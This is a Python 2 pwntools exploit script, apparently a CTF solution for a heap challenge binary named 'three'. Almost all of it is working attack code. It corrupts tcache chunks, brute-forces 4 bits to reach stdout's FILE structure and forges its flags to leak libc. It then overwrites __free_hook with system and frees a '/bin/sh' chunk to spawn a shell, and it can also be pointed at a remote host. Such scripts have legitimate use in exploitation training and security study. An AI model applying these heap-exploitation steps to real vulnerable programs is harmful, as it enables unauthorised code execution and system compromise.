#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './three'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(":", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(content):
    sa(":", content)

@choice(idx=2)
def edit(idx, content):
    sla(":", idx)
    sa(":", content)

@choice(idx=3)
def delete(idx, choice):
    sla(":", idx)
    sla(":", choice)

@choice(idx=4)
def show(idx):
    sla(":",  idx)

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new("0") #0
    new(p64(0x11)*8) #1
    delete(1, 'y')
    delete(0, 'n')
    edit(0, p8(0x50))
    new("123") #1
    new(p64(0)) #2
    delete(1, 'n')
    edit(2, p64(0) + p64(0x91))
    for i in range(7):
        delete(1, 'n')
    edit(2, p64(0) + p64(0x51))
    delete(0, 'y')
    edit(2, p64(0) + p64(0x91))
    delete(1, 'y')
    # Bruteforce 4 bits to make fd point to vi e
    edit(2,p64(0)+p64(0x51)+p16(0x7760))
    new("123")
    # Modify the flag and the write pointers
    new(p64(0xfbad1800) + p64(0)*3 + p8(0))
    r(8)
    libc_addr=uu64(r(6))
    if hex(libc_addr)[2:4] != '7f':
        raise NotImplemented
    libc.address=libc_addr - 0x3ed8b0
    lg("libc",libc.address)
    ru("Done")
    delete(0,'y')
    edit(2,p64(0)+p64(0x51)+p64(libc.symbols['__free_hook']))
    new("123")
    ga()
    edit(2,p64(0)+p64(0x61)+p64(libc.symbols['__free_hook']))
    delete(0,'y')
    new(p64(libc.symbols['system']))
    edit(2,'/bin/sh\x00')
    sla(":", 3)
    sla(":",str(2))
    '''                       
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    while True:
        try:
            exp(host,)
            break
        except Exception as e:
            print(e)
            io.close()
            io = process(exe)


